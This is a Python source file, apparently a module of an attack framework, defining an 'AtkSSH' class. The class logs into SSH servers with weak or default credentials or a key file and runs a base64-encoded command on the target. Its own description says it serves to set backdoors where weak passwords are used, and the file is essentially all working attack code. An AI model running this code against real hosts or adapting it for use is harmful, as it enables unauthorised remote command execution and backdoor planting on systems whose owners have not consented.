#!/usr/bin/env python
# coding: UTF-8
import base64
import paramiko


class AtkSSH(object):
    def __init__(self, utility, host="127.0.0.1", port=22, debug=False):
        self.utility = utility
        self.utility.target = host
        self.host = host
        self.port = port
        self.debug = debug
        self.description = "The module can be set some backdoors if weak passwords are currently used."
        self.target = host + ":" + str(port)

    def __str__(self):
        return 'AtkSSH object (target: %s:%d, description: %s)' % (self.host, self.port, self.description)

    __repr__ = __str__


    def sendattack(self, b64cmd="d2hvYW1p", user="user", pwd="password", key=None):
        cmd = base64.b64decode(b64cmd.encode()).decode()
        
        self.logger("Attack Start", "+")
        self.logger("Trying user: " + user, "+")
        if key == None:
            # is password authentication
            try:
                ssh = paramiko.SSHClient()
                ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                ssh.connect(self.host, username=user, password=pwd, port=self.port)
                stdin, stdout, stderr = ssh.exec_command(cmd)
                result = stdout.read()
                ssh.close()
                self.logger("Attack Finished!", "+")
                return result
            except Exception as e:
                print(e)
                self.logger("May be Attack failed?", "!")
                return None
        else:
            # is public key authentication
            try:
                ssh = paramiko.SSHClient()
                ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                ssh.connect(self.host, username=user, key_filename=key, port=self.port)
                stdin, stdout, stderr = ssh.exec_command(cmd)
                result = stdout.read()
                ssh.close()
                self.logger("Attack Finished!", "+")
                return result
            except Exception as e:
                #self.print_exception(e, 'Accessing is failure : {}'.format(target))
                self.logger("May be Attack failed?", "!")
                return None
                
    def logger(self, m="", o="+"):
        message = "[{}] {}".format(o,m)
        print(message)
